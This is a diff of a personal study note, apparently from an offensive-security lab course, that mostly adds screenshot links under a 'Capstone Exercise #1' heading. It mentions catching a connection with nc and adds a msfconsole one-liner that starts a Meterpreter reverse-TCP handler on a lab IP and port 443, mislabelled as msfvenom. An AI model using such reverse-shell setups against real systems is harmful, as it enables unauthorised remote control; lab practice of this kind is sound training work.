@@ -18,10 +18,17 @@ Opened a Shell prompt and try to run it with no results. Changed the execution p
 ![[Pasted image 20231017192331.png]]
 once run and having the nc open, you should be connected!
 
-### 14.3.3 Capstone Exercise
+### 14.3.3 Capstone Exercise #1
 
 ![[Pasted image 20231017202017.png]]
-
+![[Pasted image 20231018174525.png]]
 
 ![[Pasted image 20231017202440.png]]
 Download the 32 .exe file
+![[Pasted image 20231018175542.png]]
+
+![[Pasted image 20231018180301.png]]
+for this payload, we use the following msfvenom
+
+$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.181;set LPORT 443;run;" ^afd7cb
+
